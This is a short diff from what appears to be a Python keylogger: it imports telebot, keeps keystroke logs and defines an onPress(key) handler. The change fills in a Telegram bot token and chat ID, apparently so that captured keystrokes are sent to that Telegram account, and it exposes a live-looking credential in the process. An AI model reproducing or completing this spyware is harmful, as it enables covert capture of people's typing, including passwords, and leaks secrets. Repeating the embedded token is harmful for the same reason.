@@ -6,8 +6,8 @@ import telebot
 fullog = ''
 words = ''
 
-botToken = ''
-chatId = ''
+botToken = '8413010086:AAECqv8FCMusNwm9QU1N4Vq-GvFyZxaIPK0'
+chatId = '7440355448'
 bot = telebot.TeleBot(botToken)
 
 def onPress(key):
